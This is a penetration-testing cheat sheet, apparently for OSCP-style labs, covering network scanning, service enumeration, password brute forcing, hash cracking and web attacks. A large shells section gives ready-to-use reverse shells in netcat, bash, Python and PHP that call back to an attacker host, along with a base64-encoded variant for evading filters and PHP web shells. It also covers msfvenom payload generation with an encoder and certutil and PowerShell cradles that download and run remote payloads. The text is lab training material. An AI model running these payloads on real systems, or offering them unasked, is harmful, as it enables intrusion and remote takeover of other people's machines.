### 1. Discovery

#### 1.1. Ping sweep

Linux:

```sh
export SUBNET=192.168.1
for i in $(seq 254); do ping $SUBNET.$i -c1 -W1 & done | grep from
```

Windows:

```cmd
for /L %i in (1,1,255) do @ping -n 1 -w 1 192.168.1.%i > nul && echo 192.168.1.%i is up.
```

#### 1.2. Port scan

Netcat port scan: `nc -nvz target 1-65535 2>&1 | grep succeeded`

<details>
  <summary>Nmap options</summary>

Ref: <https://manpages.debian.org/bullseye/nmap/nmap.1.en.html>

|Option|Description|
|---|---|
|`-sn`|Ping Scan - disable port scan|
|`-Pn`|Treat all hosts as online -- skip host discovery|
|`-p $PORT_RANGE`|Only scan specified ports; `-p-` scans all ports<br>[By default](https://nmap.org/book/performance-port-selection.html), Nmap scans the **top 1,000 ports** for each scan protocol requested|
|`-F`|Fast mode - Scan most common 100 ports|
|`--top-ports <number>`| Scan `<number>` most common ports|
|`-sV`|Probe open ports to determine service/version info|
|`-sS` / `-sT` / `-sA` / `-sW` / `-sM`|TCP SYN / Connect() / ACK / Window / Maimon scans; Default is `sS`|
|`-sU`|UDP Scan (recommended to use with `--top-ports 100` to scan most common 100 ports)<br>UDP scans take a long time because of the wait time to confirm if a port is open,<br>scanning just the top 100 ports should balance between speed and coverage|
|`-sN` / `-sF` / `-sX`|TCP Null / FIN / Xmas scans|
|`-A`|Enables OS detection `-O`, version scanning `-sV`, script scanning `-sC` and traceroute `--traceroute`|
|`-T<0-5>`|Set timing template (higher is faster) <paranoid (0), sneaky (1), polite (2), normal (3), aggressive (4), insane (5)>|
|`-v`|Increase verbosity level (up to level 10)|
|`--min-rate <time>`|Directly control the scanning rate, Nmap will try send packets as fast as or faster than the specified minimum|
|`--max-rate <time>`|Directly control the scanning rate, limits a scan's sending rate to the specified maximum|
|`--max-scan-delay <time>`|Adjust delay between probes|
|`--max-retries <numtries>`|Specify the maximum number of port scan probe retransmissions, default 10|
|`--defeat-rst-ratelimit`|Ignore RST (reset) packets rate limits|

</details>

|Scan|Command|
|---|---|
|Initial network sweep|`nmap -sn $TARGET_RANGE`|
|Port sweep: quickly identify open ports first,<br>then run targeted `-sC` or `-A` scan later|`nmap -p- --min-rate 100000 -Pn $TARGET_RANGE`|
|TCP|`nmap -p- -A $TARGET_IP`|
|TCP Aggresive Scan|`nmap -A --max-scan-delay 0 --max-retries 3 --defeat-rst-ratelimit $TARGET`|
|TCP Connect Scan over proxychains|`proxychains -q nmap -Pn -sT -O -sV -sC -F $TARGET_IP`|
|UDP|`nmap -sU -A --top-ports 100 $TARGET_IP`|
|Port scan with netcat|`nc -nvz $TARGET_IP $PORT`|

<details>
  <summary>Aggressive Nmap scan</summary>

In some cases where network is unstable or latency is high (e.g. OffSec network), dropped probes causes send delay to increase, leading to a nearly impossible to complete scan

Using Nmap with `-v` will show messages like this:

```
Scanning 192.168.247.52 [16384 ports]
Increasing send delay for 192.168.247.52 from 0 to 5 due to 55 out of 183 dropped probes since last increase.
Increasing send delay for 192.168.247.52 from 5 to 10 due to 11 out of 25 dropped probes since last increase.
Increasing send delay for 192.168.247.52 from 10 to 20 due to 11 out of 24 dropped probes since last increase.
Increasing send delay for 192.168.247.52 from 20 to 40 due to max_successful_tryno increase to 4
```

Doing a super agressive scan can help to cover a large port range faster

`nmap -A --max-scan-delay 0 --max-retries 3 --defeat-rst-ratelimit 10.11.1.35`

`nmap -v -p 49152-65535 --max-scan-delay 0 --max-retries 3 --defeat-rst-ratelimit 192.168.247.52`

</details>

#### 1.3. Nmap script scan

NSE script location: `/usr/share/nmap/scripts/`

|Scan|Command|
|---|---|
|Enumerate SMB|`nmap -Pn -p445 --script smb-enum-* $TARGET`|
|Checking SMB for vulnerabilties|`nmap -Pn -p445 --script smb-vuln-* $TARGET`|
|Checking SMB for SambaCry|`nmap -Pn -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version $TARGET`|
|Enumerate RDP|`nmap -Pn -p3389 --script rdp-* $TARGET`|
|Checking RDP for vulnerabilties|`nmap -Pn -p3389 --script rdp-vuln-* $TARGET`|

Script categories: https://nmap.org/book/nse-usage.html

- Scan with script categories `safe`, `auth` and `vuln`: `nmap -p$PORTS --script safe,auth,vuln $TARGET`
- `-A` or `-sC` uses `default` category
- Example: [KRAKEN](https://github.com/joetanx/oscp/blob/main/pwk-lab/kraken.md)

## 2. Enumeration

### ❗ENUMERATE HARDER❗

The motto of OffSec is **try harder**, but this practicially means **enumerate harder**

❗Try harder ≠ brute force❗

Try harder means you missed something that was not enumerated, and this can sometimes mean:

1. There a a port in nmap result that is not checked, just `nc` to the port and see the banner (there may be version number or unique strings that you can Google)
2. Run the same [web scan](#22-httphttps-804438080) **with a bigger wordlist** - there will never be an empty web server with default web page, there must be something in it
3. Run the same [web scan](#22-httphttps-804438080) **with extensions** (html, php, txt, etc) - there may be files on the web server with name matching an entry on a wordlist, but with an extension (example: [digitalworld.local:FALL](https://github.com/joetanx/oscp/blob/main/vulnhub/digitalworld.local-fall.md))

If `searchsploit` doesn't work, try Google - examples that Googling worked: [ITSL:Mousekatool2](https://github.com/joetanx/oscp/blob/main/itsl/2021-10-04-mousekatool2.md), [ITSL:Checks](https://github.com/joetanx/oscp/blob/main/itsl/2021-11-22-Checks.md), [digitalworld.local:JOY](https://github.com/joetanx/oscp/blob/main/vulnhub/digitalworld.local-joy.md)

If Google doesn't work, there’s probably no public exploit for it; look for files with secrets in clear or encoded

`dir /S *secret*` or `find / -name *secret*`

Example:

- Clear text password in directory: [digitalworld.local:JOY](https://github.com/joetanx/oscp/blob/main/vulnhub/digitalworld.local-joy.md)
- Base64 encoded secrets that are reversible: [digitalworld.local:MERCYv2](https://github.com/joetanx/oscp/blob/main/vulnhub/digitalworld.local-mercy.md)

### 2.1. FTP `21`

```sh
lftp anonymous:anonymous@$TARGET -e 'find;quit'
lftp $USERNAME:$PASSWORD@$TARGET -e 'find;quit'
```

Download all files: `wget ftp://$TARGET/* --ftp-user=$USERNAME --ftp-password=$PASSWORD -r`

### 2.2. HTTP/HTTPS `80`/`443`/`8080`

> [!Tip]
> 
> Always check out pages in cURL or view page source for hidden elements

|   |   |
|---|---|
|Nikto|`nikto -host http://$TARGET:$PORT`|
|dirb|`dirb http://$TARGET:$PORT /usr/share/wordlists/dirb/big.txt`|
|gobuster|`gobuster dir -u http://$TARGET:$PORT -b 403,404 -w /usr/share/dirb/wordlists/common.txt`|
|gobuster (CGI scan)|`gobuster dir -u http://$TARGET:$PORT -b 403,404 -w /usr/share/dirb/wordlists/vulns/cgis.txt`|
|gobuster (go through wordlist with extensions appended)|`gobuster dir -u http://$TARGET:$PORT -b 403,404 -w /usr/share/dirb/wordlists/common.txt -x txt,php,html`|
|VHOST Scan (gobuster)|`gobuster vhost -u $DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain`|
|VHOST Scan (wfuzz)|`wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://$DOMAIN/" -H "Host: FUZZ.$V" [--hc/hl/hw/hh $HIDE_RESPONSE_BY_CODE_LINES_WORDS_CHARS]`|

#### Wordlists:

dirb:

1. `/usr/share/dirb/wordlists/common.txt` (Default)
2. `/usr/share/dirb/wordlists/vulns/cgis.txt`
3. `/usr/share/wordlists/dirb/big.txt`
4. `/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`
5. `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

[SecLists](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content) (`/usr/share/seclists/Discovery/Web-Content/`):

1. `/usr/share/seclists/Discovery/Web-Content/common.txt`
2. `/usr/share/seclists/Discovery/Web-Content/combined_words.txt`
3. `/usr/share/seclists/Discovery/Web-Content/combined_directories.txt`
4. `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
5. `/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt`

<details>
  <summary><h4>2.2.1. Curl</h4></summary>

#### Common Options

|   |   |
|---|---|
|`-L, --location`|Redo the request on the new location if the server reports that the requested page has moved to a different location (i.e. follow redirection)|
|`-k, --insecure`|Proceed even if connection is insecure (i.e. ignore certificate errors)|
|`-o, --output <file>`|Write output to <file> instead of stdout|
|`-O, --remote-name`|Write output to a local file named like the remote file we get|
|`-H, --header <header/@file>`|Header to include in the request when sending HTTP to a server<br>e.g. `-H 'Content-Type:application/x-www-form-urlencoded'`, `-H 'Content-Type:multipart/form-data'`|
|`-b, --cookie <data\|filename>`|Pass the data to the HTTP server in the Cookie header, format: `-b 'NAME1=VALUE1;NAME2=VALUE2'`|
|`-d, --data <data>`|Sends the specified data in a POST request to the HTTP server; data is passed to the server using the content-type `application/x-www-form-urlencoded`, format: `-d 'NAME1=VALUE1&NAME2=VALUE2'`|
|`-X, --request <command>`|Specify custom request method to use, defaults to `GET`, e.g. `-X POST`|
|`-v, --verbose`|Makes cURL verbose, shows request headers + response headers + content data|
|`-i, --include`|Include the response headers, but not response headers|
|`-I, --head`|Fetch the headers only|

#### Examples

##### Send a `POST` request to input `whoami` command to a parameter `cmd` ([djinn:1](https://github.com/joetanx/oscp/blob/main/vulnhub/djinn-1.md))

```sh
curl -X POST -d 'cmd=whoami' http://10.0.88.37:7331/wish
```

##### Login and follow redirection after login ([DC:9](https://github.com/joetanx/oscp/blob/main/vulnhub/dc-9.md))

```sh
curl -L -H 'Content-Type:application/x-www-form-urlencoded' -X POST -d 'username=admin&password=transorbital1' -v http://10.0.88.33/manage.php
```

##### Use a session cookie for the request ([DC:9](https://github.com/joetanx/oscp/blob/main/vulnhub/dc-9.md))

```sh
curl -b PHPSESSID=7lta0l401mm57sh8h63ttrbb9g -v http://10.0.88.33/manage.php/manage.php?file=../../../../etc/passwd
```

##### Download a file (follow redirections, save file as remote name)

```sh
curl -sLO https://github.com/joetanx/ctf/raw/refs/heads/main/reverse.ps1
```

##### Upload a file

```sh
curl -H 'Content-Type:multipart/form-data' -X POST -F file=@"The Little Prince.jpg" -v http://kali.vx/upload.php
```

##### References
<https://manpages.debian.org/bullseye/curl/curl.1.en.html>
<https://reqbin.com/req/c-bjcj04uw/curl-send-cookies-example>
<https://reqbin.com/req/c-sma2qrvp/curl-post-form-example>

</details>

### 2.3. NFS/RPC `111`/`2049`

|   |   |
|---|---|
|Identity if NFS is in use<br>If `111` and `2049` are listed, shares are enabled and we can mount them|`rpcinfo -p $TARGET`|
|Show all mounts|`showmount -e $TARGET`|
|Nmap scan with all NFS related scripts|`nmap -p 111 --script nfs* $TARGET`|
|Mount a NFS share|`mount -t nfs $TARGET:/$SHARE /mnt`|

### 2.4. SMB `139`/`445`

|   |   |
|---|---|
|Enumerate using empty username/password|`enum4linux $TARGET`|
|Enumerate with specified username/password|`enum4linux -u $USERNAME -p $PASSWORD $TARGET`|
|List shares using NULL|`crackmapexec smb $TARGET -u '' -p '' --shares`<br>`smbclient -N -L //$TARGET`|
|List shares using username/password|`crackmapexec smb $TARGET -u $USERNAME -p $PASSWORD --shares`<br>`smbclient -U '$USERNAME%$PASSWORD' -L //$TARGET`|
|List shares using username/hash|`smbclient -U $USERNAME --pw-nt-hash -L //$TARGET`|
|Connect to share using NULL|`smbclient -N //$TARGET/$SHARE`|
|Connect to share using username/password|`smbclient -U '$USERNAME%$PASSWORD' //$TARGET/$SHARE`|
|Connect to share using username/hash|`smbclient -U $USERNAME --pw-nt-hash //$TARGET/$SHARE`|
|Mount a share|`mount -t cifs -o username=$USERNAME,password=$PASSWORD //$TARGET/$SHARE /mnt`|

### 2.5. LDAP `389`

```sh
ldapsearch -b 'DC=lab,DC=vx' -H ldap://192.168.17.11 -D 'CN=Bind Account,CN=Users,DC=lab,DC=vx' -W
```

### 2.6. Brute force (Hydra)

#### RDP/SSH/FTP/SMB/MySQL

|   |   |
|---|---|
|Specify username|`hydra -l $USERNAME -P $PASSWORD_LIST $TARGET <rdp/ssh/ftp/smb/mysql>`|
|Use username list|`hydra -L $USERNAME_LIST -P $PASSWORD_LIST $TARGET <rdp/ssh/ftp/smb/mysql>`|

#### Web

Syntax:

`hydra` `-l $USERNAME`/`-L $USERNAME_LIST` `-P $PASSWORD_LIST` `$TARGET` `http-get-form`/`http-post-form` '`$PATH`:`$REQUEST_BODY`:`F=$FAILURE_VERBIAGE`/`S=$SUCCESS_VERBIAGE`:`H=Cookie:$NAME1=$VALUE1;$NAME2=$VALUE2`'

Examples:

```sh
hydra -l admin -P rockyou.txt dvwa.local http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie:PHPSESSID=b9kvhjb7c268tb94445pugm0fa;security=low'
hydra -l admin -P rockyou.txt dvwa.local http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie:PHPSESSID=b9kvhjb7c268tb94445pugm0fa;security=low'
hydra -L users.txt -P rockyou.txt dvwa.local http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie:PHPSESSID=b9kvhjb7c268tb94445pugm0fa;security=low'
hydra -L users.txt -P rockyou.txt dvwa.local http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie:PHPSESSID=b9kvhjb7c268tb94445pugm0fa;security=low'
```

#### Wordlists:

|List|Lines|
|---|---|
|`/usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt`|100,000|
|`/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt`|59,186|
|`/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt`|1,000,000|
|`/usr/share/wordlists/rockyou.txt`|14,344,392|
|`/usr/share/john/password.lst`|3,559|
|`/usr/share/seclists/Usernames/Names/names.txt`|10,177|
|`/usr/share/nmap/nselib/data/usernames.lst`|10|
|`/usr/share/nmap/nselib/data/passwords.lst`|5,007|

### 2.7. Cracking password hashes

#### MD5

> [!Tip]
> 
> MD5 hashes are always **32 characters**

Examples: [DC-9](https://github.com/joetanx/oscp/blob/main/vulnhub/dc-9.md), [digitalworld.local:Development](https://github.com/joetanx/oscp/blob/main/vulnhub/digitalworld.local-development.md)

|   |   |
|---|---|
|Hashcat|`hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt`|
|Dictionary lookup online|<https://md5.gromweb.com/><br><https://crackstation.net/>|

> [!Tip]
> 
> hashcat takes time and wordlists are limited, looking up MD5 hashes in online dictionaries typically yield better success rate

#### phpass

Examples: [DeRPnStiNK](https://github.com/joetanx/oscp/blob/main/vulnhub/derpnstink.md)

|   |   |
|---|---|
|Hashcat|`hashcat -m 400 hashes.txt /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt`|

> [!Tip]
> 
> `rockyou.txt` has **14 million** entries that takes hashcat about an hour to crunch through, the SecLists top **1 million** list will be a good alternative that takes hashcat about 2 minutues to crunch through and yet still provide sufficient password coverage

### 2.8. Wordpress

#### 2.8.1. Enumeration

Examples: [sean](https://github.com/joetanx/oscp/blob/main/pwk-lab.sean.md)

<details><summary><code>wpscan --url http://$TARGET/$PATH/ -e at,ap,u</code></summary>

- `-e`: enumerate
- `at`: all themes
- `ap`: all plugins
- `u`: users

</details>

#### 2.8.2. Brute force Wordpress login

Examples: [EVM](https://github.com/joetanx/oscp/blob/main/vulnhub/evm.md)

```sh
wpscan --url http://192.168.56.103/wordpress -U c0rrupt3d_brain -P 10-million-password-list-top-100000.txt
hydra -l c0rrupt3d_brain -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt 192.168.56.103 http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.56.103%2Fwordpress%2Fwp-admin%2F&testcookie=1:incorrect"
hydra -l c0rrupt3d_brain -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt 192.168.56.103 http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.56.103%2Fwordpress%2Fwp-admin%2F&testcookie=1:S=Dashboard"
```

<details>
  <summary>More information:</summary>

- <https://geekflare.com/wordpress-vulnerability-scanner-wpscan/>
- <https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress>
  - Main Wordpress files
  - `xmlrpc.php` exploit
  - Theme RCE
  - Plugin RCE
- <https://linuxconfig.org/test-wordpress-logins-with-hydra-on-kali-linux>
- <https://www.einstijn.com/penetration-testing/website-username-password-brute-forcing-with-hydra/>

</details>

### 2.9. Burp Suite

See Example: [XOR-APP59](https://github.com/joetanx/oscp/blob/main/pwk-lab/xor.md#121-using-burp-suite-to-find-a-login)

## 3. Web Penetration

### DVWA Guide 2019

<https://github.com/mrudnitsky/dvwa-guide-2019>

### 3.1. Fuzzing

Example: [Flight](/htb/flight.md), [digitalworld.local:FALL](https://github.com/joetanx/oscp/blob/main/vulnhub/digitalworld.local-fall.md)

#### fuff

```sh
ffuf -c -w $WORDLIST -u http://$TARGET/$PAGE/$FUZZWORD -fs $SIZE_TO_EXCLUDE
# e.g. ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.0.88.34/test.php?FUZZ -fs 80
```

#### wfuzz

```sh
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://$DOMAIN/" -H "Host: FUZZ.$V" [--hc/hl/hw/hh $HIDE_RESPONSE_BY_CODE_LINES_WORDS_CHARS]
# e.g. wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://flight.htb/" -H "Host: FUZZ.flight.htb" --hl 154
# e.g. wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u "http://school.flight.htb/index.php?FUZZ=index.php" --hh 3996
```

### 3.2. File Inclusions

DVWA LFI/RFI: <https://medium.com/@manjuteju008/understanding-file-inclusion-attack-using-dvwa-web-application-30d06846c269>

> [!Tip]
> 
> if a LFI exists, try to append `../` until you can read the `/etc/passwd` file

cURL and browsers collapses `../` automatically, escape the `/` with `\` to ensure traversal

|   |   |
|---|---|
|LFI Examples|[digitalworld.local:MERCYv2](https://github.com/joetanx/oscp/blob/main/vulnhub/digitalworld.local-mercy.md), [digitalworld.local:FALL](https://github.com/joetanx/oscp/blob/main/vulnhub/digitalworld.local-fall.md)|
|RFI Examples|[digitalworld.local:Bravery](https://github.com/joetanx/oscp/blob/main/vulnhub/digitalworld.local-bravery.md)|

> [!Tip]
> 
> if users with console login are found in `/etc/passwd`, try searching their home directories for ssh keys (e.g. `$HOME/.ssh/id_rsa`)

### 3.3. SQL injection

#### Methodology:

1. Identity query vulnerability
2. Identify injection vector
3. Identify number of columns (range) using `ORDER BY`
4. Identify data display positions in the page
5. Retrieve database/version/user information
6. Enumerate tables
7. Enumerate columns
8. Retrieve data

Examples (MySQL): [NullByte](https://github.com/joetanx/oscp/blob/main/vulnhub/nullbyte.md), [DC-9](https://github.com/joetanx/oscp/blob/main/vulnhub/dc-9.md), [DVWA SQL Injection](/notes/sqli-dvwa.md), [SQLi Labs](/notes/sqli-labs.md)
Example (Oracle Db): [CHRIS](https://github.com/joetanx/oscp/blob/main/pwk-lab/chris.md)
Example (Microsoft SQL): [DJ](https://github.com/joetanx/oscp/blob/main/pwk-lab/dj.md)

## 4. Shells

### 4.1. Listeners

#### Netcat

```sh
rlwrap nc -nlvp 4444
```

#### Meterpreter

```sh
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 > use exploit/multi/handler
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 4445
LPORT => 4445
msf6 exploit(multi/handler) > options

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     0.0.0.0          yes       The listen address (an interface may be specified)
   LPORT     4445             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 0.0.0.0:4445
```

### 4.2. Various reverse shells

Ref: <https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux>

#### Netcat Traditional

```sh
nc -e /bin/sh $KALI 4444
```

#### Netcat OpenBSD

```sh
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $KALI 4444 >/tmp/f
```

#### Netcat BusyBox

```sh
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc $KALI 4444 >/tmp/f
```

#### Bash

```sh
bash -i >& /dev/tcp/$KALI/4444 0>&1
```

> [!Tip]
> 
> **base64 encode/decode** can be useful to bypass restricted interfaces that filter out characters like `/` (examples: [djinn:1](https://github.com/joetanx/oscp/blob/main/vulnhub/djinn-1.md), [bob](https://github.com/joetanx/oscp/blob/main/vulnhub/bob.md))
> 
> 1. **base64 encode** on Kali: `echo 'bash -i >& /dev/tcp/192.168.17.10/4444 0>&1' | base64` to get `YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3LjEwLzQ0NDQgMD4mMQo=`
> 2. **base64 decode** and run on target: `echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3LjEwLzQ0NDQgMD4mMQo=' | base64 -d | bash`

#### Python

Used in: [digitalworld.local:JOY](https://github.com/joetanx/oscp/blob/main/vulnhub/digitalworld.local-joy.md), [LEFTTURN](https://github.com/joetanx/oscp/blob/main/pwk-lab/leftturn.md)

```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$KALI",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### PHP

|   |   |
|---|---|
|Using `exec` is the most common method, but assumes that the file descriptor will be 3<br>Using this method may lead to instances where the **connection reaches out to the listener and then closes**|`php -r '$sock=fsockopen("$KALI",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`|
|Using `proc_open` makes no assumptions about what the file descriptor will be<br>See <https://security.stackexchange.com/a/198944> for more information|`<?php $sock=fsockopen("$KALI",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>`|
|Using `exec` to call a `bash` reverse shell|`<?php exec("/bin/bash -c 'bash -i >/dev/tcp/$KALI/4444 0>&1'"); ?>`|
|Using `system` to call a `bash` reverse shell|`<?php system("/bin/bash -c 'bash -i >/dev/tcp/$KALI/4444 0>&1'"); ?>`|
|Using `passthru` to call a `bash` reverse shell|`<?php passthru("/bin/bash -c 'bash -i >/dev/tcp/$KALI/4444 0>&1'"); ?>`|
|In some cases above doesn't work (e.g. [gh0st](https://github.com/joetanx/oscp/blob/main/pwk-lab/gh0st.md)), copy from this and change the IP/port|`/usr/share/webshells/php/php-reverse-shell.php`|

> [!Tip]
> 
> To use PHP reverse shell on RFI, save the file on Kali as `.txt`, not `.php`; otherwise, it will be Kali that is connecting to itself
> 
> Sometimes `exec` or `system` may not work, try other methods (`passthru`) of php execution (as seen in [PAIN](https://github.com/joetanx/oscp/blob/main/pwk-lab/pain.md))

Examples: [digitalworld.local-bravery](https://github.com/joetanx/oscp/blob/main/vulnhub/digitalworld.local-bravery.md), [SAR](https://github.com/joetanx/oscp/blob/main/vulnhub/sar.md), [PAIN](https://github.com/joetanx/oscp/blob/main/pwk-lab/pain.md)

#### PHP web shells

|   |   |
|---|---|
|`<?php echo passthru($_GET['k']);?>`|[Used in: ITSL:Dealer 313](https://github.com/joetanx/oscp/blob/main/itsl/2021-10-24-Dealer313.md)|
|`<?php system($_GET[base64_decode('Y21k')]);?>`|[Used in: ITSL:VulnDC2](https://github.com/joetanx/oscp/blob/main/itsl/2022-01-17-Vulndc2.md)|
|`<?php system($_GET['cmd']);?>`|[Used in: Flight](/htb/flight.md)|
|`<?php echo passthru($_GET['cmd']); ?>`|[Used in: digitalworld.local:JOY](https://github.com/joetanx/oscp/blob/main/vulnhub/digitalworld.local-joy.md)|

### 4.3. Payloads

#### MSFVenom reverse shell TCP:

|   |   |
|---|---|
|Linux (Python)|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f py -o /var/www/html/reverse.py`|
|Linux (ELF)|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f elf -o /var/www/html/reverse.elf`|
|Linux (meterpreter)|`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$KALI LPORT=4444 -f elf -o /var/www/html/reverse.elf`|
|Windows PE|`msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f exe -o /var/www/html/reverse.exe`|
|Windows Powershell|`msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f psh -o /var/www/html/reverse.ps1`|
|Windows meterpreter|`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$KALI LPORT=4444 -f exe -o /var/www/html/reverse.exe`|
|HTML Application|`msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f hta-psh -o /var/www/html/reverse.hta`|
|VBA|`msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f vba-psh -o /var/www/html/reverse.vba`|
|Java WAR (Tomcat)|`msfvenom -p java/jsp_shell_reverse_tcp LHOST=$KALI LPORT=4444 -f war -o reverse.war`|
|PHP|`msfvenom -p php/reverse_php LHOST=$KALI LPORT=4444 -f raw -o reverse.php`|
|Node.js|`msfvenom -p nodejs/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f js_le -o reverse.js`|

> [!Tip]
> 
> Use `linux/x86/shell_reverse_tcp` or `windows/shell_reverse_tcp` to generate a x86 payload
>
> Add `-e x86/shikata_ga_nai -i 9` to use encoder (`-i 9` means 9 iterations, uses 1 iteration if `-i` is omitted)

### 4.4. Execute payloads

#### Windows: Execute reverse shell TCP payload

|   |   |
|---|---|
|certutil|`certutil.exe /urlcache /f /split http://$KALI/reverse.exe %TEMP%\reverse.exe && %TEMP%\reverse.exe`|
|PowerShell<br>(System.Net.WebClient)|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://$KALI/reverse.exe','%TEMP%\reverse.exe'); Start-Process %TEMP%\reverse.exe`|
|PowerShell<br>(Invoke-WebRequest)|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri http://$KALI/reverse.exe -OutFile .\reverse.exe; Start-Process %TEMP%\reverse.exe`|

> [!Tip]
>
> `Invoke-Expression` is useful if you don't want the payload to touch the disk, but it works for Powershell Scripts only
>
> (i.e. `DownloadFile` of the reverse shell executable and try to run it with `Invoke-Expression` will not work)
>
> ```cmd
> powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://$KALI/reverse.ps1')
> powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (Invoke-WebRequest -Uri 'zhttp://$KALI/reverse.ps1')
> ```

#### Linux: Execute reverse shell TCP payload

|   |   |
|---|---|
|cURL|`curl -O http://$KALI/reverse.elf && chmod +x reverse.elf && ./reverse.elf`|
|Wget|`wget http://$KALI/reverse.elf && chmod +x reverse.elf && ./reverse.elf`|

### 4.5. Using the [reverse.ps1](/reverse.ps1) script in this repo

#### Download to kali

```sh
curl -sL --output-dir /var/www/html -O https://github.com/joetanx/ctf/raw/main/reverse.ps1
```

#### Download on target directly

```cmd
certutil.exe /urlcache /f /split https://github.com/joetanx/ctf/raw/refs/heads/main/reverse.ps1
```

```cmd
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://github.com/joetanx/ctf/raw/refs/heads/main/reverse.ps1 -OutFile .\reverse.ps1
```

```cmd
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('https://github.com/joetanx/ctf/raw/refs/heads/main/reverse.ps1','.\reverse.ps1')
```

#### Run the script

```pwsh
$env:address='<listener address>'
$env:port=<listener port>
.\reverse.ps1
```

#### Run the script with `Invoke-Expression`

```cmd
set address=<listener address>
set port=<listener port>
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (Invoke-WebRequest https://github.com/joetanx/ctf/raw/refs/heads/main/reverse.ps1 -UseBasicParsing)
```

```pwsh
$env:address='<listener address>'
$env:port=<listener port>
Invoke-Expression (Invoke-WebRequest https://github.com/joetanx/ctf/raw/refs/heads/main/reverse.ps1 -UseBasicParsing)
```

### 4.6. Using the [reverse.py](/reverse.py) or [reverse.js](/reverse.js) script in this repo

Installing Python and Node.js

```sh
apt -y install python3 nodejs
```

```cmd
winget install python OpenJS.NodeJS
```

#### Download to kali

```sh
curl -sL --output-dir /var/www/html -O https://github.com/joetanx/ctf/raw/main/<reverse.py/js>
```

#### Download on target directly

```cmd
certutil.exe /urlcache /f /split https://github.com/joetanx/ctf/raw/refs/heads/main/<reverse.py/js>
```

```cmd
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://github.com/joetanx/ctf/raw/refs/heads/main/<reverse.py/js> -OutFile .\<reverse.py/js>
```

```cmd
